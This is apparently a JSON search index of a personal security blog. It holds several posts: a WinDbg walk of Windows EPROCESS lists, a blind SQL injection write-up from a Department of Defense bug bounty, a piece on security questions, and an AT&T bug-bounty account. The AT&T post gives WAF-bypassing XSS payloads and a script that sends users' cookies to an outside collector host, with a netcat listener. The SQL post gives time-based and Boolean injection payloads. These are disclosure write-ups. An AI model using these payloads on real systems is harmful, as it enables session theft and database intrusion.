ActiveProcessLinks.flink -y ImageFileName +0x448 ActiveProcessLinks : [ 0xffffc509`c8373488 - 0xffffc509`c5488488 ] +0x000 Flink : 0xffffc509`c8373488 _LIST_ENTRY [ 0xffffc509`c8194508 - 0xffffc509`c54f64c8 ] +0x5a8 ImageFileName : [15] \u0026#34;Registry\u0026#34; The Registry service! Alright. And once more we see the next address is at 0xffffc509`c8373488. We\u0026rsquo;ll get the ImageFileName for that entry as well:\nlkd\u0026gt; dt nt!_eprocess 0xffffc509`c8373488-0x448 -y ActiveProcessLinks.flink -y ImageFileName +0x448 ActiveProcessLinks : [ 0xffffc509`c8194508 - 0xffffc509`c54f64c8 ] +0x000 Flink : 0xffffc509`c8194508 _LIST_ENTRY [ 0xffffc509`ca6794c8 - 0xffffc509`c8373488 ] +0x5a8 ImageFileName : [15] \u0026#34;smss.exe\u0026#34; And that\u0026rsquo;s the smss.exe executable, which provides functionality for Microsoft Window\u0026rsquo;s Session Manager Subsystem.\nWe could continue walking the EPROCESS list and enumerate every processes forward and backwards pointers. But I won\u0026rsquo;t iterate through all of them manually here.\nThe kernel debugger in Windows also provides some nice built-in functionality to make looping through process structures pretty fast. We can use the !process module in the kernel debugger to get information about active processes, like so:\nlkd\u0026gt; !process 0 0 **** NT ACTIVE PROCESS DUMP **** PROCESS ffffc509c5488040 SessionId: none Cid: 0004 Peb: 00000000 ParentCid: 0000 DirBase: 001ae002 ObjectTable: ffffda878c2aae80 HandleCount: 2748. Image: System PROCESS ffffc509c54f6080 SessionId: none Cid: 006c Peb: 00000000 ParentCid: 0004 DirBase: 1031d5002 ObjectTable: ffffda878c259cc0 HandleCount: 0. Image: Registry PROCESS ffffc509c8373040 SessionId: none Cid: 01c0 Peb: 5d58682000 ParentCid: 0004 DirBase: 10dcb5002 ObjectTable: ffffda878d5909c0 HandleCount: 58. Image: smss.exe ... We can verify our work here. The expression 0xffffc509`c5488488 - `0x448 evaluates to 0xffffc509c5488040. So, we know our System value is correct.\nBut what about our Registry value? Well, 0xffffc509`c54f64c8 - 0x448 gives us 0xffffc509c54f6080. So our Registry value is also correct.\nAnd our entry for smss.exe appears to be on accurate as well. Verifying it against the kernel debugger\u0026rsquo;s !process module output, it correctly evaluates to 0xffffc509c8373040, which is the result of the offset subtraction we did prior: 0xffffc509`c8373488 - 0x448.\nWe can use a simple Python script to double check that the offsets we calculated beforehand align with those printed out by the !process module:\noffset = 0x448 memory_addresses = [ 0xffffc509c5488488, 0xffffc509c54f64c8, 0xffffc509c8373488 ] for address in memory_addresses: result = address - offset print(hex(result)) 0xffffc509c5488040 0xffffc509c54f6080 0xffffc509c8373040 ","permalink":"https://hexagram.foo/posts/finding-active-processes-with-windbg/","summary":"\u003cp\u003eIn the Windows kernel, each process is assigned an EPROCESS structure, which is a kernel object that represents a program or process. And a Process Environment Block (PEB) is just one of many structures pointed to by the EPROCESS structure.  A snippet from \u003ccode\u003e_EPROCESS\u003c/code\u003e as documented on Vergilius Project:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-C\" data-lang=\"C\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003evolatile\u003c/span\u003e \u003cspan class=\"n\"\u003eULONGLONG\u003c/span\u003e \u003cspan class=\"n\"\u003eOwnerProcessId\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003e_PEB\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003ePeb\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003e_MM_SESSION_SPACE\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003eSession\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eVOID\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003eSparel\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eIn user space however, we cannot directly reference all of the EPROCESS structures and their data. At most, we can do something like \u003ccode\u003edt nt!_EPROCESS\u003c/code\u003e in windbg and get a peek at the layout. We\u0026rsquo;ll have to enable kernel debugging to more closely examine things. But here\u0026rsquo;s what we can see in user mode. The EPROCESS structure is large. The entire output from windbg is as follows:\u003c/p\u003e","title":"Finding Active Processes with Windbg"},{"content":"A Brief History Inference, that is, induction and deduction, are perhaps my personal favorite classes of problem-solving methods. Given very little initial information, depending on our model and situation, we can utilize just a few points to infer other information which was never directly presented to us. From Pythagoras, to Euclid, and Spinoza—to the use of modern inductive algorithms like those being developed at MIRI—inference is a powerful primitive, and somewhat of a universal open secret, playing a role almost everywhere we look—from philosophy, to economics, game theory, aerospace, medicine, computer science, and any scenario in which probability is of importance. In the spirit of Lewis Carrol:\nWhen a person says a thing, they often express another thing they don\u0026rsquo;t mean to reveal.\nIn Microprocessors You may have heard of attacks like Meltdown and Specter, variants of side-channel attacks which broke the compartmentalization that was previously assumed in microprocessors. These vulnerabilities affected microprocessors that performed an operation known as branch prediction. To put it simply, attackers could use JavaScript and HTML5 to exploit a low level design flaw in the microprocessor architecture itself to bypass sandbox mechanisms, leak memory, and predict the instruction flow. Meltdown exploited a race condition and timing attack. Specter exploited time-based errors to infer memory artifacts. In short, simply visiting a webpage was enough to leak private memory and execute code. The papers on meltdownattack.com, authored by researchers abroad, offer full technical overviews of both attacks. Prior knowledge of how computers work across all the abstraction layers—including architecture design, the features assembly language give us, what C and C++ give us, to kernels and drivers, and how desktop applications operate on top of these layers—are helpful to know if you\u0026rsquo;re curious about the deeper details.\nIn Cryptography Like the above premise, inferential attacks often occur when a cryptosystem can be timed, thus we can glean information about algorithms and key material. In general, cryptographic systems should utilize constant-time algorithms. But this isn\u0026rsquo;t always straightforward. Memory accesses, mathematical operations, and CPU hardware can present technical hurdles. We\u0026rsquo;ll cover cryptography engineering in future posts.\nIn Web Applications Likewise, we find a very similar class of vulnerabilities in web applications. This is usually the result of unsanitized inputs (unparameterized queries) involving databases like MySQL and PostgreSQL, and can lead to various flavors of SQL injection.\nInferential Injection While fuzzing the Department Of Defense\u0026rsquo;s Bug Bounty Program for security vulnerabilities, I actually discovered one such web application issue. While doing reconnaissance, glancing over HTTP requests, I found an endpoint making a suspicious call. A server was posting a request like:\nPOST https://example.deptofdefense.xyz/server/api/this.php HTTP/1.1 Host: example.deptofdefense.xyz User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Content-Length: 404 Origin: https://example.deptofdefense.xyz Connection: close Cookie: example=404; PHPSESSID=987654321 // Variables and queries redacted for privacy and brevity busy=0\u0026amp;phone=1 ... There were many variables in this request, but a few of them weren\u0026rsquo;t correctly parameterized. Appending a backtick would throw an error:\nhttps://research.deptofdefense.xyz/server/api/this.php?phone=1\u0026#39; Performing a time-based payload test by injecting WAIT FOR DELAY '0:0:10''; into the vulnerable parameter successfully caused the server\u0026rsquo;s response to be delayed by 10 seconds. It was also possible to perform Boolean tests.\nhttps://research.deptofdefense.xyz/server/api/this.php?phone=1\u0026#39; AND 6=6-- Furthermore, we could use Boolean statements to test if very particular conditions returned True or False. For example, if we wanted to see if the string length of the first table in information_schema.tables was five characters, e.g. potentially \u0026ldquo;users\u0026rdquo;:\nhttps://research.deptofdefense.xyz/server/api/this.php?phone=1\u0026#39; AND (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 5 --+ It follows that we can iteratively do this, testing each character of the potential table name\u0026rsquo;s ASCII values. It\u0026rsquo;s slow. But this can allow us to enumerate the database. If the request loads successfully, it returned True. Here we test for the ASCII value 117, or the letter u.\nhttps://research.deptofdefense.xyz/server/api/this.php?phone=1\u0026#39; AND (ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1)) = 117) Iterating with this process, it was possible to enumerate and verify various table names in a database as a proof of concept for Boolean/time-based injection. The Department of Defense have since patched this vulnerability. When using SQL, always remember to correctly parameterize your queries.\n","permalink":"https://hexagram.foo/posts/inference-side-channel-attacks/","summary":"\u003ch2 id=\"a-brief-history\"\u003eA Brief History\u003c/h2\u003e\n\u003cp\u003eInference, that is, induction and deduction, are perhaps my personal favorite classes of problem-solving methods. Given very little initial information, depending on our model and situation, we can utilize just a few points to infer other information which was never directly presented to us. From Pythagoras, to Euclid, and Spinoza—to the use of modern inductive algorithms like those being developed at MIRI—inference is a powerful primitive, and somewhat of a universal open secret, playing a role almost everywhere we look—from philosophy, to economics, game theory, aerospace, medicine, computer science, and any scenario in which probability is of importance. In the spirit of Lewis Carrol:\u003c/p\u003e","title":"Inference: Side-Channel Attacks"},{"content":"In the time before improved multi-factor authentication schemes like Authy and Yubikeys, there were security questions. And for some reason, they seem as though they\u0026rsquo;ll never give us up. Even today, some organizations still rely on them, asking users to set questions and answers as a way to validate users out-of-band, in the event of forgetting a password. You might recall services like AOL and AIM using these. But if anything, they\u0026rsquo;re more of a security vulnerability.\nRecently, while pentesting a company this week, I was briefly reminded of this concept, being prompted to set questions and answers to the likes of \u0026ldquo;Where did you grow up?\u0026rdquo;, \u0026ldquo;What was your first car?\u0026rdquo;, \u0026ldquo;Who is your favorite musical artist?\u0026rdquo; While some implementations might rely on more robust security question configurations that employ other variables like texts, email, or actual 2FA before authorizing a password reset, some don\u0026rsquo;t.\nObviously this means sometimes all that may be needed to reset a user\u0026rsquo;s password is to answer a few questions which could potentially be passively gleaned from the internet or social engineering.\nGiven that we have new generations of technologies and services that enable much safer multiple-factor authentication, it\u0026rsquo;s concerning to see some organizations still using primitive security question questionnaires to authorize password resets. I think we should abandon the practice entirely.\n","permalink":"https://hexagram.foo/posts/security-theater-questions/","summary":"\u003cp\u003eIn the time before improved multi-factor authentication schemes like Authy and Yubikeys, there were security questions. And for some reason, they seem as though they\u0026rsquo;ll never give us up. Even today, some organizations still rely on them, asking users to set questions and answers as a way to validate users out-of-band, in the event of forgetting a password. You might recall services like AOL and AIM using these. But if anything, they\u0026rsquo;re more of a security vulnerability.\u003c/p\u003e","title":"Security (Theater) Questions"},{"content":"Then In February 2020, I decided to check out web application security programs on HackerOne. I set my eyes on AT\u0026amp;T for the novel fact that, in the 1960s, they almost invented the internet, but their research was prematurely halted citing costs and technical hurdles. Nonetheless, AT\u0026amp;T\u0026rsquo;s Picturephone is a historical but often forgotten piece of history.\nAfter burning nearly $500 million dollars on the effort, AT\u0026amp;T, then known as Bell Labs, scrapped the project entirely. And later, the Advanced Research Projects Agency and Department of Defense would lay claim to inventing the base technologies which would eventually grow to become the Internet.\nNow Fast forward to today. The web is at full sprawl. It\u0026rsquo;s technologies, for better or worse, are spread ubiquitously across the landscape. Which means bugs and security vulnerabilities, of every variation, all the way down.\nAnd I mean it with love when I say that Javascript is a lot like the new Adobe Flash. It\u0026rsquo;s everywhere. And it\u0026rsquo;s not going away anytime soon. So, it was both surprising and amusing to find a Javascript injection on the front page of AT\u0026amp;T right off the bat.\nJavascript Forever Enumerating some of the endpoints on AT\u0026amp;T, I noticed AT\u0026amp;T\u0026rsquo;s global search function.\u0026lt;\nhttps://www.att.com/global-search/search?q= Primitive payloads were filtered by the Web Application Firewall, so I started experimenting with backslashes and other weird symbols, riffing on some of the scripts similar to those in the PayloadAllTheThings repository.\nSeveral methods slid by the WAF. The initial bypass I found was via UTF-7 encoding. And then alerts wrapped recursively in slashes, as the WAF would trim the outer string, but not the inner one, resulting in Javascript successfully firing off.\n+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4- onclick=alert(1)//\u0026lt;button ‘ onclick=alert(1)//\u0026gt; */ alert(1)// Better Javascript Injection What if we linked our endpoint and parameter with a payload that, instead of just pushing an alert, forwarded an AT\u0026amp;T user\u0026rsquo;s cookies to our server instead?\nWith our EC2 running and netcat listening, nc -lvk 80, we could have phished for users with something like:\nonclick=alert(0)//\u0026lt;x//\u0026gt; */\u0026lt;script\u0026gt;var x=new Image;x.src=\u0026#34;http://collector.com/c?\u0026#34;+document.cookie;\u0026gt;\u0026lt;/script\u0026gt; GET /?c=ides_stack=ffdc;%20UUID=5ffed473-7499-a532-55cc-2dd805e22347;%20rxVisitor=1610536052551ME0RQ4NIKFI7HSPH1QN16E613GTL8KK5;%20dtSa=-;%20check=true;%20AMCVS_55633F7A534535110A490D44%40AdobeOrg=1;%20AMCV_55633F7A534535110A490D44%40AdobeOrg=1994364360%7CMCMID%7C45961868193201069648845035995403097869%7CMCAID%7CNONE%7CMCOPTOUT-1610543253s%7CNONE%7CvVersion%7C3.4.0;%20TLTSID=0D2C3598EC12B6969588B251277DC370;%20mbox=session HTTP/1.1 Host: 6.6.6.6 Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Furthermore, beyond cookie theft, we could have potentially used JavaScript injection to initialize account actions or steal authentication tokens. But registering an account required having a service contract with AT\u0026amp;T. So my testing stopped there. I immediately dropped AT\u0026amp;T a note about this and they patched shortly after.\n","permalink":"https://hexagram.foo/posts/small-bugs-big-bugs/","summary":"\u003ch2 id=\"then\"\u003eThen\u003c/h2\u003e\n\u003cp\u003eIn February 2020, I decided to check out web application security programs on HackerOne. I\nset my eyes on AT\u0026amp;T for the novel fact that, in the 1960s, they almost invented the\ninternet,\nbut their research was prematurely halted citing costs and technical hurdles. Nonetheless, AT\u0026amp;T\u0026rsquo;s Picturephone is a historical but often forgotten piece of history.\u003c/p\u003e\n\u003cp\u003eAfter burning nearly $500 million dollars on the effort, AT\u0026amp;T, then known as Bell Labs, scrapped the project entirely. And later, the Advanced Research Projects Agency and Department of Defense would lay claim to inventing the base technologies which would eventually grow to become the Internet.\u003c/p\u003e","title":"Small Bugs, Big Bugs"},{"content":"Just another github blog. I\u0026rsquo;m interested in physics, math, engineering, brains, language, and economics.\n","permalink":"https://hexagram.foo/about/","summary":"\u003cp\u003eJust another github blog. I\u0026rsquo;m interested in physics, math, engineering, brains, language, and economics.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"fog\" loading=\"lazy\" src=\"/about/fog.jpeg\"\u003e\u003c/p\u003e","title":"About"}]